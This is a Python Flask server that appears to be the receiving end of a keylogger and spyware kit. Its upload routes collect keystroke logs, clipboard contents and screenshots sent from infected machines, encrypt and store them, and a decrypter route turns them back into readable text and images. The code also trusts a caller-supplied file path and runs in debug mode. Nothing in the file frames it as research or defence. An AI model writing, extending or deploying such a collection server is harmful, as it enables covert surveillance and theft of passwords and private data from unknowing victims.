from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
from datetime import datetime
import os
import logging

app = Flask(__name__)

# Directories for different data types
UPLOAD_FOLDER = 'Uploads'
DECRYPTED_FOLDER = 'DecryptedFiles'
KEY_FILE = 'secret.key'

KEYLOGGER_FOLDER = os.path.join(UPLOAD_FOLDER, 'keylogger')
CLIPBOARD_FOLDER = os.path.join(UPLOAD_FOLDER, 'clipboard')
SCREENSHOT_FOLDER = os.path.join(UPLOAD_FOLDER, 'screenshot')

DECRYPTED_KEYLOGGER_FOLDER = os.path.join(DECRYPTED_FOLDER, 'keylogger')
DECRYPTED_CLIPBOARD_FOLDER = os.path.join(DECRYPTED_FOLDER, 'clipboard')
DECRYPTED_SCREENSHOT_FOLDER = os.path.join(DECRYPTED_FOLDER, 'screenshot')

# Ensure necessary directories exist
os.makedirs(KEYLOGGER_FOLDER, exist_ok=True)
os.makedirs(CLIPBOARD_FOLDER, exist_ok=True)
os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
os.makedirs(DECRYPTED_KEYLOGGER_FOLDER, exist_ok=True)
os.makedirs(DECRYPTED_CLIPBOARD_FOLDER, exist_ok=True)
os.makedirs(DECRYPTED_SCREENSHOT_FOLDER, exist_ok=True)

# Load or generate encryption key
def load_key():
    """Load the encryption key from a file."""
    try:
        with open(KEY_FILE, 'rb') as key_file:
            return key_file.read()
    except FileNotFoundError:
        raise FileNotFoundError(f"Encryption key file '{KEY_FILE}' not found.")

# Encrypt data
def encrypt_data(data):
    """Encrypt data using the encryption key."""
    key = load_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    return encrypted_data

# Decrypt data
def decrypt_data(encrypted_data):
    """Decrypt data using the encryption key."""
    key = load_key()
    fernet = Fernet(key)
    try:
        return fernet.decrypt(encrypted_data)
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        raise ValueError(f"Error decrypting data: {e}")

# Save and process file
def save_and_process_file(file_data, folder, prefix):
    """Encrypt the file data and save it."""
    encrypted_data = encrypt_data(file_data)
    
    # Save encrypted binary data
    bin_filename = os.path.join(folder, f'{prefix}_{datetime.now().strftime("%Y%m%d%H%M%S")}.bin')
    with open(bin_filename, 'wb') as bin_file:
        bin_file.write(encrypted_data)
    
    return bin_filename

# Route for uploading files (keylogger data)
@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file upload for keylogger data."""
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    file_data = file.read()
    bin_filename = save_and_process_file(file_data, KEYLOGGER_FOLDER, 'keylogger')
    
    return jsonify({'message': 'File processed and saved successfully', 'binary': bin_filename})

# Route for uploading clipboard data
@app.route('/upload_clipboard', methods=['POST'])
def upload_clipboard():
    """Handle upload of clipboard data."""
    clipboard_data = request.get_json().get('clipboard')
    if not clipboard_data:
        return jsonify({'error': 'No clipboard data provided'}), 400

    bin_filename = save_and_process_file(clipboard_data.encode(), CLIPBOARD_FOLDER, 'clipboard')
    
    return jsonify({'message': 'Clipboard data processed and saved successfully', 'binary': bin_filename})

# Route for uploading screenshots
@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Handle screenshot file upload."""
    if 'screenshot' not in request.files:
        return jsonify({'error': 'No screenshot file part'}), 400
    
    screenshot = request.files['screenshot']
    if screenshot.filename == '':
        return jsonify({'error': 'No selected screenshot'}), 400

    screenshot_data = screenshot.read()
    bin_filename = save_and_process_file(screenshot_data, SCREENSHOT_FOLDER, 'screenshot')
    
    return jsonify({'message': 'Screenshot processed and saved successfully', 'binary': bin_filename})

@app.route('/decrypter', methods=['POST'])
def decrypter():
    """Handle decryption of encrypted files."""
    data = request.get_json()
    if 'image_path' not in data:
        return jsonify({'error': 'No image path provided'}), 400
    
    encrypted_path = data['image_path']
    if not os.path.exists(encrypted_path):
        return jsonify({'error': 'File does not exist'}), 400
    
    try:
        # Read the encrypted binary data
        with open(encrypted_path, 'rb') as enc_file:
            encrypted_data = enc_file.read()

        # Decrypt the data
        decrypted_data = decrypt_data(encrypted_data)
        
        # Determine where to save the decrypted file based on its original directory
        if KEYLOGGER_FOLDER in encrypted_path:
            decrypted_folder = DECRYPTED_KEYLOGGER_FOLDER
            decrypted_extension = '.txt'
        elif CLIPBOARD_FOLDER in encrypted_path:
            decrypted_folder = DECRYPTED_CLIPBOARD_FOLDER
            decrypted_extension = '.txt'
        elif SCREENSHOT_FOLDER in encrypted_path:
            decrypted_folder = DECRYPTED_SCREENSHOT_FOLDER
            decrypted_extension = '.png'
        else:
            return jsonify({'error': 'Unknown file type'}), 400
        
        # Save the decrypted data
        filename = os.path.basename(encrypted_path).replace('.bin', decrypted_extension)
        decrypted_path = os.path.join(decrypted_folder, filename)
        with open(decrypted_path, 'wb') as file:
            file.write(decrypted_data)
        
        return jsonify({'message': 'File decrypted successfully', 'decrypted_file': decrypted_path})
    except Exception as e:
        logging.error(f"Error during decryption: {e}")
        return jsonify({'error': f'Error during decryption: {e}'}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
